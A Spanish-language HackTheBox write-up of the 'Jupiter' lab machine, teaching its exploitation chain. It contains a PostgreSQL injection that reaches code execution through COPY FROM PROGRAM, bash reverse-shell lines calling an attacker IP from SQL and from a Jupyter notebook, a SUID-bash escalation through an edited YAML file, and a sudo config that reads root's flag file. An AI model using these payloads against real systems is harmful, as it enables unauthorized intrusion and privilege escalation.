---
layout: default
title: Jupiter
parent: HackTheBox
grand_parent: Writeups
---

# Jupiter
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---
Descubriremos un subdomino el cual hace uso de grafana y su API, para la intrusion haremos un SQLi a RCE usando un ruta de la API para realizar consultar, despues haremos movimiento lateral mediante un archivo YAML, despues otro movimiento lateral usando Jupyter el cual nos permitira ejecutar comando y mandarnos una rev shell, y para root abusaremos de un binario donde le indicaremos que descargue el archivo de la flag y lo guarde en un directorio dentro de /tmp

{:.lead}

## Enumeracion

Iniciamos con un escaneo de nmap con:

```
sudo nmap -sS -n -Pn -T4 --open -p- 10.10.11.216
```

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Y nos reporto que hay dos puertos abiertos:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo ese puerto:

```
sudo nmap -sCV -p22,80 10.10.11.216
```
Vemos que por el puerto 80 nos dice que nos redirecciona a **jupiter.htb**, asi que debemos de agregar ese dominio al /etc/hosts

```ruby
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Al explorar la web principal no encontraremos nada que nos interese, asi que toca hacer fuzzing

### Fuzzing de subdominios

Si hacemos fuzzing de directorios para ver descubrir rutas:

```ruby
wfuzz -u 'http://jupiter.htb/FUZZ' -w /usr/share/wordlists/directory-list-2.3-medium.txt -t 100 --hc=404
```

Nos mostrara que existen varias rutas, pero ninguna es de interes, asi que probaremos con subdominios:

```ruby
wfuzz -u 'http://jupiter.htb' -H 'Host: FUZZ.jupiter.htb' -t 100 -w /usr/share/wordlists/directory-list-2.3-medium.txt --hh=178 --hc=404
```

```ruby
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jupiter.htb/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                 
=====================================================================

000000007:   400        7 L      12 W       166 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                       
000000009:   400        7 L      12 W       166 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                                   
000013173:   200        211 L    798 W      34390 Ch    "kiosk"                                                                                                 
000162619:   200        211 L    798 W      34390 Ch    "Kiosk" 
```

Y logramos encontrar el de **kiosk**, asi que tambien lo agregamos al /etc/hosts

### Investigando kiosk.jupiter.htb

Cuando entramos a la web por primera vez vamos a poder ver que esta haciendo uso de grafana, incluso por unos segundos podemos ver en el ```title``` de la pagina que se esta usando grafana, basicamente grafana es un software para el analisis y monitoreo de datos metricos, grafana tambien dispone de una API, asi que es muy posible que se este usando para realizar cosas por detras, si entramos a la pagina web encontraremos un dashboard donde veremos la cantidad de lunas de los planetas

![](/assets/img/jupiter/1.png)

Si exploramos un poco, nos deremos cuenta que en cada seccion que contiene la informacion de los planetas y las lunas, se encuentra un pequeño menu, donde podemos encontrar mas informacion

![](/assets/img/jupiter/2.png)

Si le damos en inspeccionar y en panel JSON, podemos ver esto todo esto:

```json
{
  "datasource": {
    "type": "postgres",
    "uid": "YItSLg-Vz"
  },
  "fieldConfig": {
    "defaults": {
      "custom": {
        "align": "auto",
        "cellOptions": {
          "type": "auto"
        },
        "inspect": false
      },
      "mappings": [],
      "thresholds": {
        "mode": "absolute",
        "steps": [
          {
            "color": "green",
            "value": null
          },
          {
            "color": "red",
            "value": 80
          }
        ]
      },
      "color": {
        "mode": "thresholds"
      }
    },
    "overrides": []
  },
  "gridPos": {
    "h": 8,
    "w": 12,
    "x": 0,
    "y": 15
  },
  "id": 24,
  "options": {
    "showHeader": true,
    "cellHeight": "sm",
    "footer": {
      "show": false,
      "reducer": [
        "sum"
      ],
      "countRows": false,
      "fields": "",
      "enablePagination": true
    }
  },
  "pluginVersion": "9.5.2",
  "targets": [
    {
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "editorMode": "code",
      "format": "table",
      "hide": false,
      "rawQuery": true,
      "rawSql": "select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;",
      "refId": "A",
      "sql": {
        "columns": [
          {
            "parameters": [],
            "type": "function"
          }
        ],
        "groupBy": [
          {
            "property": {
              "type": "string"
            },
            "type": "groupBy"
          }
        ],
        "limit": 50
      }
    }
  ],
  "title": "Moons of Planet Saturn",
  "transparent": true,
  "type": "table"
}
```

Podemos ver que como base de datos se esta usando **postgreSQL** y eso nos los dice en:

```json
"datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
```
(si quieres investigar un poco mas de esto puedes ver la documentacion: [aqui](https://grafana.com/docs/grafana/latest/datasources/postgres/))

Y abajo podemos ver la consulta que se esta realizando:

```json
"rawSql": "select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;",
```
Hasta ahora tenemos que usa grafana, postgreSQL, y que se hacen consultas a una base de datos para obtener la informacion de las lunas de los planetas.

Hace un momento habia mencionado que grafana tiene una API, pues esta es la [Data source API](https://grafana.com/docs/grafana/latest/developers/http_api/data_source/), vi vemos un poco la documentacion nos dice que si hacemos una peticion a **GET /api/datasources** obtendremos informacion de todas las fuentes de datos:

```json
[
  {
    "id": 1,
    "uid": "YItSLg-Vz",
    "orgId": 1,
    "name": "PostgreSQL",
    "type": "postgres",
    "typeName": "PostgreSQL",
    "typeLogoUrl": "public/app/plugins/datasource/postgres/img/postgresql_logo.svg",
    "access": "proxy",
    "url": "localhost:5432",
    "user": "grafana_viewer",
    "database": "",
    "basicAuth": false,
    "isDefault": true,
    "jsonData": {
      "database": "moon_namesdb",
      "sslmode": "disable"
    },
    "readOnly": false
  }
]
```

Y ahora confirmamos que la base de datos es una PostgreSQL como lo dice en **"name": "PostgreSQL"**, ademas de que la base de datos es **moon_namesdb** como lo dice en **database": "moon_namesdb"**, ahora debemos de encontrar la forma de realizar consultar a la base de datos para ver si existen un posible SQLi, si seguimos viendo la documentacion de la API, encontraremos que a tra vez de la ruta **/api/ds/query** podemos realizar peticiones por POST y realizar consultas a la base da datos.

Si intentamos acceder mediante la URL: **http://kiosk.jupiter.htb/api/ds/query**, no vamos a poder, afortunadamente BurpSuite en el apartado de proxy tiene una opcion la cual permite ver todo el historial HTTP, vean que si nos regresamos al dashboard y le damos en inspeccionar en panel JSON, tenemos que en el historial HTTP se esta accediendo a **/api/ds/query**:

![](/assets/img/jupiter/3.png)

Si mandamos esto al repeater, podemos ver la consulta que se esta haciendo

```sql
"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Jupiter';",
```

Asi que toca probar SQLi

## SQL injection

Si mostramos el nombre de la base de datos:

```sql
SELECT current_database()
```
Podemos ver que nos reporta la base de datos que esta en uso:

```json
"data":{
    "values":[
        [
            "moon_namesdb"
        ]
    ]
}
```
**Ojo:** Ahora empezare a enumerar la base de datos haciedo uso de **pg_catalog** la cual es similar a **information_schema**, ya que esta contiene informacion de las bases de datos, esto no es necesario ya que no encontraremos nada que nos sirva, solo lo hago por que se me hace interesante.

### Enumeracion de la DB

Como sabemos que se esta haciendo uso de **postgreSQL** podemos usar **pg_catalog** para enumerar la base de datos, usando **SELECT * FROM pg_catalog.pg_database;** mostraremos todas las base de datos existentes, con **pg_catalog.pg_database** le estamos diciendo que de **pg_catalog** muestre las bases de datos, y eso lo indicamos con **pg_database**, el resultado son todas las bases de datos existentes

```json
[
    "postgres",
    "moon_namesdb",
    "template1",
    "template0"
],
```
Vemos que la base de datos que nos interesa es la **moon_namesdb**, asi que ahora empezaremos a enumerar las tablas de esta base da datos, ten en cuenta que no es necesario usar un **WHERE** para indicarle la base datos que queremos enumerar por que **moon_namesdb** ya esta en uso, asi que las consultas se harian usando esa base de datos, usando de 
```
SELECT tablename FROM pg_catalog.pg_tables;
``` 

Obtendremos todas las tablas, en este caso le indicamos con el SELECT que obtenga la columna llamada ```tablename``` de ```pg_tables``` la cual tiene todas las tablas de la base de datos ```moon_namesdb```, podemos observar dos tablas interesantes: ```pg_user_mapping``` y ```pg_shadow```, si mostramos todos los datos usando ```SELECT * FROM pg_shadow``` nos mostrara eso:

```json
"values":[
    [
        "postgres",
        "grafana_viewer"
    ],
    [
        "10",
        "16385"
    ],
    [
        null,
        "SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w==$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss=:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY="
    ],
]
```

Parace ser el hash de una contraseña, que no podemos crackear, y si mostramos los datos de ```pg_user_mapping``` no saldra nada, asi que es posible que debamos de hacer otra cosa, intentaremos realizar un RCE para mandarnos una reverse shell, guiandonos de [aqui](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution) usaremos este consulta para conseguir RCE:

```sql
CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/<tu ip>/443 0>&1\"';
```
- Con ```CREATE TABLE cmd_exec(cmd_output text)``` le estamos diciendo que cree una tabla llamada ```cmd_exec``` en la cual tendra una columna llamada ```cmd_output``` de tipo ```text```, la cual tendra el resultado del comando ejecutado

- Despues con ```COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/<tu ip>/443 0>&1\"'``` le estamos diciendo que copie datos a la tabla ```cmd_exec``` ademas de que con ```PROGRAM``` estamos haciendo el llamado de un programa externo el cual es ```bash``` y ejecutara la reverse shell

Y ya conseguimos una reverse shell

## Movimiento lateral de postgres a Juno

Empezaremos analizando los procesos que esten ejecutandose en la maquina, asi que ejecutare pspy y encontraremos que se esta ejecutando un script desde el usuario Juno

```bash
CMD: UID=1000  PID=21104  | /bin/bash /home/juno/shadow-simulation.sh
```

Ademas tambien veremos que esta copiando el archivo ```network-simulation.yml``` a ```/dev/shm```

```bash
cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
```

Si vemos el contenido del archivo tenemos esto:

```yaml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

Si analizamos un poco, vemos que se esta implementando un servidor y un cliente, de lado del servidor se esta ejecutando un comando de python el cual iniciar un servidor http:

```yaml
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
```

Y del lado del cliente se esta haciendo una peticion a ese servidor creado:

```yaml
processes:
    - path: /usr/bin/curl
      args: -s server
```

Como tenemos permisos de escritura en el archivo, entonces podemos decirle que ejecute cualquier otro comando, lo mas sencillo es darle permisos SUID a bash para que nosotros tengamos una shell como Juno, editaremos el archivo yaml de esta manera:

```yaml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/bash
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/bash
      start_time: 5s
```
Y depues de unos segundos en el directorio ```/tmp``` tendremos el binario bash con permisos SUID, solo ejecutamos y ya somos Juno, ah este punto ya tenemos la flag de user

## Movimiento lateral de Juno a Jovian

Si vemos a que grupos pertenece Juno, podemos ver que existe en el Science:

```
uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)
```

Si buscamos por acrhivos que pertenescan a ese grupo, encontramos varios de Jupyter

```
find / -type f -group science 2> /dev/null
```

```
/opt/solar-flares/flares.csv
/opt/solar-flares/xflares.csv
/opt/solar-flares/map.jpg
/opt/solar-flares/start.sh
/opt/solar-flares/logs/jupyter-2023-03-10-25.log
/opt/solar-flares/logs/jupyter-2023-03-08-37.log
/opt/solar-flares/logs/jupyter-2023-03-08-38.log
/opt/solar-flares/logs/jupyter-2023-03-08-36.log
/opt/solar-flares/logs/jupyter-2023-03-09-11.log
/opt/solar-flares/logs/jupyter-2023-03-09-24.log
/opt/solar-flares/logs/jupyter-2023-03-08-14.log
/opt/solar-flares/logs/jupyter-2023-03-09-59.log
/opt/solar-flares/flares.html
/opt/solar-flares/cflares.csv
/opt/solar-flares/flares.ipynb
/opt/solar-flares/mflares.csv
```

Si vemos uno de los logs vamos a poder ver unos token:

```
cat /opt/solar-flares/logs/jupyter-2023-03-08-37.log
```

```
To access the notebook, open this file in a browser:
  file:///home/jovian/.local/share/jupyter/runtime/nbserver-1388-open.html
Or copy and paste one of these URLs:
  http://localhost:8889/?token=5313d7bfe0eb674db299f627f4be1212d17c6758b7b98989
```
Asi que es posible que ocupemos ese token para acceder a Jupyter

Y un poco mas arriba del mismo log nos dice que el puerto 8888 esta ocupado:

```
[I 11:37:49.348 NotebookApp] The port 8888 is already in use, trying another port.
[I 11:37:49.349 NotebookApp] Serving notebooks from local directory: /opt/solar-flares
```

Eso lo podemos comprobar por que si mostramos los puertos abiertos, el 8888 esta ocupado:

```
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44097         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33637         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:54143         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:56017         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -  <--- Este                 
tcp        0      0 127.0.0.1:39535         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:45609         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```

Asi que haremos portforwarding de ese puerto:

```
ssh -L 8888:127.0.0.1:8888 juno@10.10.11.216
```

Como era de esperarse, tenemos que usar un token para acceder:

![](/assets/img/jupiter/4.png)

Podemos usar el token que averiguamos anteriormente, pero en caso de que no te funcione, puedes buscar mas tokens en: ```/opt/solar-flares/logs```

Si vemos uno de los archivos, podemos ver que es esta ejecutando un comando, asi que nosotros podemos intentar lo mismo pero una reverse shell

![](/assets/img/jupiter/5.png)

Jupyter al estar trabajando un Python, entonces nos mandaremos un reverse shell usando el modulo ```os```:

```py
import os; os.system('bash -c "bash -i >& /dev/tcp/<tu_ip>/443 0>&1"')
```

Una vez que lo ejecutemos ya seremos Jovian

![](/assets/img/jupiter/6.png)

## Jovian a Root

Si buscamos por binarios que podamos ejectuar como root sin contraseña con ```sudo -l```, podemos ver uno que se llama ```sattrack```

```
User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```

Si lo tratamos de ejecutar nos dira que un archivo de configuracion no se encuentra:

```
/usr/local/bin/sattrack
Satellite Tracking System
Configuration file has not been found. Please try again!
```

Si vemos el tipo de archivo que es sattrack nos dira que es un binario ELF:

```
/usr/local/bin/sattrack: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c68bedeeb5dd99903454a774db56a7a533ce7ff4, for GNU/Linux 3.2.0, not stripped
```

Me pase el archivo a mi maquina, y usando rabin2, mostrare los string buscando por archivos de configuracion:

```
rabin2 -z sattrack | grep -i config
```
```
491 0x0007bd48 0x0007bd48 16   17   .rodata ascii   /tmp/config.json
```

Podemos ver que esta buscando un archivo JSON en ```/tmp/config.json```, si buscamos mas informacion de sattrack en internet, podemos ver su repositorio y el archivo json que espera: [https://github.com/arf20/arftracksat/blob/master/config.json](https://github.com/arf20/arftracksat/blob/master/config.json)

Si seguimos buscando por archivos config.json de sattrack encontraremos uno en ```/usr/local/share/sattrack/config.json``` el cual contiene esto

```json
{
	"tleroot": "/tmp/tle/",
	"tlefile": "weather.txt",
	"mapfile": "/usr/local/share/sattrack/map.json",
	"texturefile": "/usr/local/share/sattrack/earth.png",
	
	"tlesources": [
		"http://celestrak.org/NORAD/elements/weather.txt",
		"http://celestrak.org/NORAD/elements/noaa.txt",
		"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=t
le"
	],
	
	"updatePerdiod": 1000,
	
	"station": {
		"name": "LORCA",
		"lat": 37.6725,
		"lon": -1.5863,
		"hgt": 335.0
	},
	
	"show": [
	],
	
	"columns": [
		"name",
		"azel",
		"dis",
		"geo",
		"tab",
		"pos",
		"vel"
	]
}
```
Asi que ese lo copiaremos al directorio /tmp

Una vez que tengamos el config.json en /tmp, ejecutaremos el sattrack: ```sudo /usr/local/bin/sattrack```

Vemos como estara intentando descargar recursos de los URL que estan dentro de:

```json
	"tlesources": [
		"http://celestrak.org/NORAD/elements/weather.txt",
		"http://celestrak.org/NORAD/elements/noaa.txt",
		"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
],
```

![](/assets/img/jupiter/9.png)

Y luego los guardara en ```/tmp/tle/``` como lo indica ```"tleroot": "/tmp/tle/",```

Asi que podriamos hacer que descargue de la misma maquina el archivo de la flag de root y lo guarde en el directorio ```/tmp/tle/```

Editaremos el archivo ```config.json``` y agregaremos esto en ```tlesources``` --> ```"file:///root/root.txt"```, quedando el archivo asi:

```json
{
	"tleroot": "/tmp/tle/",
	"tlefile": "weather.txt",
	"mapfile": "/usr/local/share/sattrack/map.json",
	"texturefile": "/usr/local/share/sattrack/earth.png",
	
	"tlesources": [
		"file:///root/root.txt"
	],
	
	"updatePerdiod": 1000,
	
	"station": {
		"name": "LORCA",
		"lat": 37.6725,
		"lon": -1.5863,
		"hgt": 335.0
	},
	
	"show": [
	],
	
	"columns": [
		"name",
		"azel",
		"dis",
		"geo",
		"tab",
		"pos",
		"vel"
	]
}
```
Solo lo ejecutamos y ya tendriamos la flag de root

![](/assets/img/jupiter/8.png)

Eso ha sido todo, gracias por leer ❤